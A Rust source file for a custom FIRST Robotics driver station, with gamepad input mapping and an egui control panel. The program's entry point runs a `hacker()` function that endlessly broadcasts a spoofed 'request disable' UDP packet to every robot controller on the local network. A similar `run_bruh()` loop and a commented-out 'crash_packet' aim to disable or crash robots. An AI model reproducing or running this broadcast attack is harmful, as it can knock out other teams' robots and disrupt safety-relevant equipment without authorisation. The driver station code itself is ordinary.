// let mut idk_socket = Socket::new(1130, 1140);
// idk_socket.set_input_nonblocking(true);
// let mut fms_socket = Socket::new(1160, 1120);
// fms_socket.set_input_nonblocking(true);
// let mut netconsole_socket = Socket::new("0.0.0.0:6668", "0.0.0.0:6666");
// netconsole_socket.set_input_nonblocking(true);

use std::{
    net::{IpAddr, Ipv4Addr, SocketAddr, SocketAddrV4},
    sync::Arc,
};

use crate::roborio::simulate_roborio;
use eframe::egui::{self};
use net_comm::driverstation::{
    self,
    console_message::{Ignore, SystemConsoleOutput},
    message_handler::MessageConsole,
};
use robot_comm::{
    common::{
        joystick::{Joystick, NonNegU16},
        request_code::{DriverstationRequestCode, RobotRequestCode},
    },
    driverstation::RobotComm,
    robot_to_driver::RobotToDriverstationPacket,
    util::buffer_writter::{BufferWritter, SliceBufferWritter, WriteToBuff},
};

#[derive(Default, Clone, Copy)]
struct Pov {
    val: u8,
}
impl Pov {
    pub fn to_val(&self) -> NonNegU16 {
        match self.val {
            0b0001 => NonNegU16::new(0),
            0b0011 => NonNegU16::new(45),
            0b0010 => NonNegU16::new(90),
            0b0110 => NonNegU16::new(90 + 45),
            0b0100 => NonNegU16::new(180),
            0b1100 => NonNegU16::new(180 + 45),
            0b1000 => NonNegU16::new(180 + 90),
            0b1001 => NonNegU16::new(180 + 90 + 45),
            _ => NonNegU16::none(),
        }
    }

    pub fn set_up(&mut self, pressed: bool) {
        self.val = self.val & !1 | pressed as u8;
    }
    pub fn set_right(&mut self, pressed: bool) {
        self.val = self.val & !0b10 | ((pressed as u8) << 1);
    }
    pub fn set_down(&mut self, pressed: bool) {
        self.val = self.val & !0b100 | ((pressed as u8) << 2);
    }
    pub fn set_left(&mut self, pressed: bool) {
        self.val = self.val & !0b1000 | ((pressed as u8) << 3);
    }
}

// struct State {
//     listener: Listener,
//     controllers: Vec<Controller>,
//     povs: Vec<Pov>,
//     rumble: (f32, f32),
//     comm: Arc<RobotComm>,
// }

// impl State {
//     fn connect(&mut self, controller: Controller) -> Poll<Exit> {
//         if controller.name() != "input-remapper gamepad" {
//             println!(
//                 "Connected p{}, id: {:016X}, name: {}",
//                 self.controllers.len() + 1,
//                 controller.id(),
//                 controller.name(),
//             );
//             let mut joy = Joystick::default();
//             joy.set_button(9, false).unwrap();
//             joy.set_pov(0, NonNegU16::none()).unwrap();
//             joy.set_axis(5, 0).unwrap();
//             self.comm.update_joystick(self.controllers.len(), joy);
//             self.controllers.push(controller);
//             self.povs.push(Default::default());
//         }
//         Pending
//     }

//     fn event(&mut self, id: usize, event: Event) -> Poll<Exit> {
//         let player = id + 1;
//         println!("p{}: {}", player, event);

//         self.comm.modify_joystick(id, |joy| {
//             if let Event::Disconnect = event {
//                 self.controllers.swap_remove(id);
//                 *joy = None;
//             } else if let Some(joy) = joy {
//                 match event {
//                     Event::ActionA(bool) => joy.set_button(0, bool).unwrap(),
//                     Event::ActionB(bool) => joy.set_button(1, bool).unwrap(),
//                     Event::ActionV(bool) => joy.set_button(2, bool).unwrap(),
//                     Event::ActionH(bool) => joy.set_button(3, bool).unwrap(),

//                     Event::MenuL(bool) => joy.set_button(4, bool).unwrap(),
//                     Event::MenuR(bool) => joy.set_button(5, bool).unwrap(),

//                     Event::BumperL(bool) => joy.set_button(6, bool).unwrap(),
//                     Event::BumperR(bool) => joy.set_button(7, bool).unwrap(),
//                     Event::Joy(bool) => joy.set_button(8, bool).unwrap(),
//                     Event::Cam(bool) => joy.set_button(9, bool).unwrap(),

//                     Event::ActionC(bool) => joy.set_button(2, bool).unwrap(),
//                     Event::ActionD(bool) => joy.set_button(3, bool).unwrap(),
//                     Event::ActionL(bool) => joy.set_button(0, bool).unwrap(),
//                     Event::ActionM(bool) => joy.set_button(0, bool).unwrap(),
//                     Event::ActionR(bool) => joy.set_button(0, bool).unwrap(),

//                     Event::JoyX(val) => joy.set_axis(0, (val * 255.0) as i8).unwrap(),
//                     Event::JoyY(val) => joy.set_axis(1, (val * 255.0) as i8).unwrap(),
//                     Event::JoyZ(val) => joy.set_axis(2, (val * 255.0 * 255.0) as i8).unwrap(),
//                     Event::CamZ(val) => joy.set_axis(3, (val * 255.0 * 255.0) as i8).unwrap(),
//                     Event::CamX(val) => joy.set_axis(4, (val * 255.0) as i8).unwrap(),
//                     Event::CamY(val) => joy.set_axis(5, (val * 255.0) as i8).unwrap(),

//                     Event::PovUp(pressed) => {
//                         self.povs[id].set_up(pressed);
//                         joy.set_pov(0, self.povs[id].to_val()).unwrap();
//                     }
//                     Event::PovRight(pressed) => {
//                         self.povs[id].set_right(pressed);
//                         joy.set_pov(0, self.povs[id].to_val()).unwrap();
//                     }
//                     Event::PovDown(pressed) => {
//                         self.povs[id].set_down(pressed);
//                         joy.set_pov(0, self.povs[id].to_val()).unwrap();
//                     }
//                     Event::PovLeft(pressed) => {
//                         self.povs[id].set_left(pressed);
//                         joy.set_pov(0, self.povs[id].to_val()).unwrap();
//                     }
//                     _ => {}
//                 }
//                 // println!("{joy:#?}")
//             }
//         });
//         Pending
//     }
// }

pub fn controller(driverstation: Arc<RobotComm>) {
    let mut gilrs = gilrs::Gilrs::new().unwrap();
    // gilrs.gamepads()
    let mut povs = [Pov::default(); 6];
    loop {
        while let Some(event) = gilrs.next_event() {
            // println!("{:#?}", event);

            driverstation.modify_joystick(event.id.into(), |controller| {
                if event.event == gilrs::EventType::Connected || controller.is_none() {
                    let mut default = Joystick::default();

                    for _ in 0..6 {
                        default.push_axis(0).unwrap();
                    }
                    for _ in 0..10 {
                        default.push_button(false).unwrap();
                    }
                    default.push_pov(NonNegU16::none()).unwrap();

                    // println!("{:#?}", default);

                    *controller = Some(default);
                } else if event.event == gilrs::EventType::Disconnected
                    || event.event == gilrs::EventType::Dropped
                {
                    *controller = None;
                }
                if let Some(controller) = controller.as_mut() {
                    match event.event {
                        gilrs::EventType::ButtonChanged(butt, val, _) => match butt {
                            gilrs::Button::LeftTrigger2 => {
                                controller.set_axis(2, (val * 127.5 - 0.5) as i8).unwrap()
                            }
                            gilrs::Button::RightTrigger2 => {
                                controller.set_axis(3, (val * 127.5 - 0.5) as i8).unwrap()
                            }
                            _ => {}
                        },
                        gilrs::EventType::ButtonPressed(butt, _)
                        | gilrs::EventType::ButtonReleased(butt, _) => {
                            let val = matches!(event.event, gilrs::EventType::ButtonPressed(..));

                            let index = match butt {
                                gilrs::Button::South => 0,
                                gilrs::Button::East => 1,
                                gilrs::Button::North => 3,
                                gilrs::Button::West => 2,
                                // gilrs::Button::C => todo!(),
                                // gilrs::Button::Z => todo!(),
                                gilrs::Button::LeftTrigger => 6,
                                // gilrs::Button::LeftTrigger2 => todo!(),
                                gilrs::Button::RightTrigger => 7,
                                // gilrs::Button::RightTrigger2 => todo!(),
                                gilrs::Button::Select => 4,
                                gilrs::Button::Start => 5,
                                // gilrs::Button::Mode => todo!(),
                                gilrs::Button::LeftThumb => 8,
                                gilrs::Button::RightThumb => 9,

                                // no DPAD kinda barbonzo
                                gilrs::Button::DPadUp => {
                                    let index: usize = event.id.into();
                                    povs[index].set_up(val);

                                    controller.set_pov(0, povs[index].to_val()).unwrap();
                                    return;
                                }
                                gilrs::Button::DPadDown => {
                                    let index: usize = event.id.into();
                                    povs[index].set_down(val);
                                    controller.set_pov(0, povs[index].to_val()).unwrap();
                                    return;
                                }
                                gilrs::Button::DPadLeft => {
                                    let index: usize = event.id.into();
                                    povs[index].set_left(val);
                                    controller.set_pov(0, povs[index].to_val()).unwrap();
                                    return;
                                }
                                gilrs::Button::DPadRight => {
                                    let index: usize = event.id.into();
                                    povs[index].set_right(val);
                                    controller.set_pov(0, povs[index].to_val()).unwrap();
                                    return;
                                }

                                // gilrs::Button::Unknown => todo!(),
                                _ => return,
                            };
                            controller.set_button(index, val).unwrap();
                        }
                        // gilrs::EventType::ButtonReleased(_, _) => todo!(),
                        // gilrs::EventType::ButtonChanged(_, _, _) => todo!(),
                        gilrs::EventType::AxisChanged(axis, val, _) => {
                            match axis{
                                gilrs::Axis::LeftStickX =>
                                controller.set_axis(0, (val * 127.5 - 0.5) as i8).unwrap(),
                                gilrs::Axis::LeftStickY =>
                                controller.set_axis(1, (val * 127.5 - 0.5) as i8).unwrap(),
                                // gilrs::Axis::LeftZ => 
                                // controller.set_axis(2, (val * 127.5 - 0.5) as i8).unwrap(),
                                // gilrs::Axis::RightZ => 
                                // controller.set_axis(3, (val * 127.5 - 0.5) as i8).unwrap(),
                                gilrs::Axis::RightStickX =>
                                controller.set_axis(4, (val * 127.5 - 0.5) as i8).unwrap(),
                                gilrs::Axis::RightStickY =>
                                controller.set_axis(5, (val * 127.5 - 0.5) as i8).unwrap(),
                                _ => {}
                                // gilrs::Axis::DPadX => todo!(),
                                // gilrs::Axis::DPadY => todo!(),
                                // gilrs::Axis::Unknown => todo!(),
                            }
                        }
                        _ => {}
                    }
                }
            });
        }

        std::thread::sleep(std::time::Duration::from_millis(10))
    }
}

pub mod bruh;
pub mod controllers;
pub mod roborio;

fn main() {
    // bruh::run_bruh()
    // simulate_roborio()
    // run_driverstation()
    // run_bruh()
    hacker()
}

pub fn hacker() {
    use std::net::*;
    use std::time::Duration;

    let disable_packet = [
        0u8, 0, 1, /*com version*/
        0, 0xFF, 0, 0, 2, /*request disable*/
    ];

    // broadcast
    let ip_addr = Ipv4Addr::new(255, 255, 255, 255);
    let socket_addr = SocketAddr::V4(SocketAddrV4::new(ip_addr, 1150));
    let socket = UdpSocket::bind("0.0.0.0:1110").unwrap();
    socket.set_broadcast(true).unwrap();
    loop {
        socket.send_to(&disable_packet, socket_addr).unwrap();
        std::thread::sleep(Duration::from_millis(20));
    }
}

pub fn run_bruh() {
    let mut packet = RobotToDriverstationPacket::default();

    packet.tag_comm_version = 1;
    packet.request.set_request_disable(true);

    let mut buf = [0u8; 200];
    let mut buf2 = [0u8; 200];
    let mut buf = SliceBufferWritter::new(&mut buf);
    packet.write_to_buf(&mut buf).unwrap();
    let buf = buf.curr_buf();

    println!("{:?}", buf);

    // let disable_packet = [0,0,1 /*com version*/,0,0,0,0,2 /*request disable*/];
    // let crash_packet = [0,0,0 /*invalid comm tag*/,0,0,0,0,0xFF /* no idea why but this is needed too*/];
    // std::net::UdpSocket::join_multicast_v4(&self, multicast_loop_v4)
    // let ip_addr = Ipv4Addr::new(10,11,14,206);
    let ip_addr = Ipv4Addr::new(255, 255, 255, 255);

    // let ip_addr = Ipv4Addr::new(10,39,66,178);
    let socket_addr = SocketAddr::V4(SocketAddrV4::new(ip_addr, 1150));
    let socket = std::net::UdpSocket::bind("0.0.0.0:1110").unwrap();
    socket.set_broadcast(true).unwrap();
    loop {
        // println!("{:?}", socket.recv_from(&mut buf2).unwrap());
        socket.send_to(&buf2, socket_addr).unwrap();
        std::thread::sleep(std::time::Duration::from_millis(20));
        // socket.send_to(&crash_packet, socket_addr).unwrap();
        // std::thread::sleep(std::time::Duration::from_millis(20));
    }
}

pub fn run_driverstation() {
    // listener.
    // simulate_roborio();

    // let ipaddr =
    // robot_comm::util::robot_discovery::find_robot_ip(1114).expect("Failed to find roborio");
    let ipaddr = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
    // let ipaddr = IpAddr::V4(Ipv4Addr::new(10, 11, 14, 2));
    // println!("FOUND ROBORIO: {:?}", ipaddr);

    let driverstation = RobotComm::new(Some(ipaddr));
    driverstation.start_new_thread();
    // driverstation.set_request_code(*RobotRequestCode::new().set_request_lib(true));

    {
        let driverstation = driverstation.clone();
        _ = std::thread::spawn(move || controller(driverstation));
    }

    MessageConsole::create_new_thread(SystemConsoleOutput {}, ipaddr);
    // MessageConsole::new(SystemConsoleOutput {}).run_blocking(ipaddr);

    let options = eframe::NativeOptions {
        initial_window_size: Some(egui::vec2(320.0, 240.0)),
        ..Default::default()
    };

    eframe::run_native(
        "Driver Station",
        options,
        Box::new(|_cc| Box::new(MyApp { driverstation })),
    )
    .unwrap()
}

struct MyApp {
    driverstation: Arc<RobotComm>,
}

impl eframe::App for MyApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        egui::CentralPanel::default().show(ctx, |ui| {
            let status = self.driverstation.get_observed_status();
            if self.driverstation.is_connected() {
                if status.has_robot_code() {
                    ui.label(format!(
                        "Has Robot Code ip: {:?}",
                        self.driverstation.get_robot_ip()
                    ));
                } else {
                    ui.label("No Robot Code");
                }
            } else {
                ui.label("No robot communication");
            }

            let control = self.driverstation.get_observed_control();

            if control.is_brown_out_protection() {
                ui.label("BROWN OUT PROTECTION");
            }

            // if control.is_estop() {
            //     ui.label("ESTOP");
            // }

            if ui.selectable_label(control.is_estop(), "ESTOP").clicked() {
                self.driverstation.set_estop(!control.is_estop());
                // control.set_estop(!control.is_estop());
            }

            if control.is_driverstation_attached() {
                ui.label("NO IDEA");
            }
            if ui.button("restart code").clicked() {
                self.driverstation
                    .set_request_code(*RobotRequestCode::new().set_restart_roborio_code(true))
            }

            if ui.button("restart rio").clicked() {
                self.driverstation
                    .set_request_code(*RobotRequestCode::new().set_restart_roborio(true))
            }

            if ui
                .selectable_label(control.is_driverstation_attached(), "Bruh")
                .clicked()
            {
                self.driverstation.set_ds_attached(true);
            }
            self.driverstation
                .modify_joystick(0, |joy| println!("{:#?}", joy));

            // ui.input(|i| {
            //     let speed =
            //         i.key_down(egui::Key::W) as i8 * -10 + i.key_down(egui::Key::S) as i8 * 10;
            //     let turn =
            //         i.key_down(egui::Key::A) as i8 * -10 + i.key_down(egui::Key::D) as i8 * 10;

            //     self.driverstation.modify_joystick(0, |joy| {
            //         if let Some(joy) = joy {
            //             if joy.get_axis(1).is_none() {
            //                 joy.set_axis(1, 0).unwrap();
            //             }
            //             if joy.get_axis(4).is_none() {
            //                 joy.set_axis(4, 0).unwrap();
            //             }
            //             joy.set_axis(1, joy.get_axis(1).unwrap().saturating_add(speed))
            //                 .unwrap();
            //             joy.set_axis(4, joy.get_axis(4).unwrap().saturating_add(turn))
            //                 .unwrap();
            //             if speed == 0 {
            //                 joy.set_axis(1, 0).unwrap();
            //             }
            //             if turn == 0 {
            //                 joy.set_axis(4, 0).unwrap();
            //             }
            //         } else {
            //             *joy = Some(Default::default());
            //         }
            //         // println!("{:#?}", joy);
            //     });
            // });

            ui.horizontal(|ui| {
                ui.vertical(|ui| {
                    if ui
                        .toggle_value(&mut control.is_teleop(), "Teleop")
                        .clicked()
                    {
                        self.driverstation.set_disabled();
                        self.driverstation.set_teleop();
                    }
                    if ui
                        .toggle_value(&mut control.is_autonomus(), "Auton")
                        .clicked()
                    {
                        self.driverstation.set_disabled();
                        self.driverstation.set_autonomus();
                    }
                    if ui.toggle_value(&mut false, "Practis").clicked() {
                        self.driverstation.set_disabled();
                        //TODO: add practis mode support
                    }
                    if ui.toggle_value(&mut control.is_test(), "Test").clicked() {
                        self.driverstation.set_disabled();
                        self.driverstation.set_test()
                    }
                });

                ui.vertical(|ui| {
                    ui.label(format!("{:.2}", self.driverstation.get_observed_voltage()));

                    ui.horizontal(|ui| {
                        let en_res = ui.toggle_value(&mut control.is_enabled(), "Enable");

                        let dis_res = ui.toggle_value(&mut !control.is_enabled(), "Dissable");

                        if en_res.clicked() {
                            self.driverstation.set_enabled();
                        }
                        if dis_res.clicked() {
                            self.driverstation.set_disabled();
                        }
                    });
                });
            });

            if ui.button("Reconnect").clicked() {
                self.driverstation.reconnect()
            }

            // Plot::new("Bruh").view_aspect(2.0).show(ui, |plot_ui| {});

            ctx.request_repaint();
        });
    }
}
